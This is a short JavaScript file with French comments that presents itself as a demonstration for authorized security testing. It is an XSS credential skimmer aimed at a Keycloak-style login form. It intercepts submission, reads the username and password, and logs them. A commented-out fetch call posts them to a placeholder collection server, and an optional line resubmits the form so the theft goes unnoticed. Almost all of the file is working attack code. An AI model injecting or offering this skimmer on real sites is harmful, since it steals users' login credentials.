// ATTENTION : Ce script est destiné aux tests de sécurité autorisés uniquement.
// Il démontre comment, en cas de vulnérabilité XSS, un attaquant pourrait intercepter
// les données saisies dans le formulaire, y compris le mot de passe.
// Utilisez ce code uniquement dans des environnements de test approuvés.

document.addEventListener('DOMContentLoaded', function () {
    // Vérifier que le formulaire existe
    var loginForm = document.getElementById('kc-form-login');
    if (!loginForm) {
        console.error('Le formulaire de connexion n\'a pas été trouvé.');
        return;
    }
    
    // Attacher un écouteur sur la soumission du formulaire
    loginForm.addEventListener('submit', function (event) {
        // Empêcher la soumission du formulaire pour pouvoir traiter les données
        event.preventDefault();
        
        // Récupérer les valeurs des champs "username" et "password"
        var usernameField = document.getElementById('username');
        var passwordField = document.getElementById('password');
        
        if (usernameField && passwordField) {
            var usernameValue = usernameField.value;
            var passwordValue = passwordField.value;
            
            // Afficher les valeurs dans la console pour démonstration
            console.log('Identifiants capturés :');
            console.log('Nom d\'utilisateur :', usernameValue);
            console.log('Mot de passe :', passwordValue);
            
            // Optionnel : envoyer les données à un serveur de test pour les exfiltrer
            // (Remplacez 'https://votre-serveur-de-test.com/collect' par l'URL de votre endpoint)
            /*
            fetch('https://votre-serveur-de-test.com/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username: usernameValue, password: passwordValue })
            })
            .then(response => console.log('Données exfiltrées avec succès'))
            .catch(error => console.error('Erreur lors de l\'exfiltration :', error));
            */
        } else {
            console.error('Les champs requis n\'ont pas été trouvés.');
        }
        
        // Optionnel : Pour continuer avec la soumission réelle après la capture, décommentez la ligne suivante :
        // loginForm.submit();
    });
});
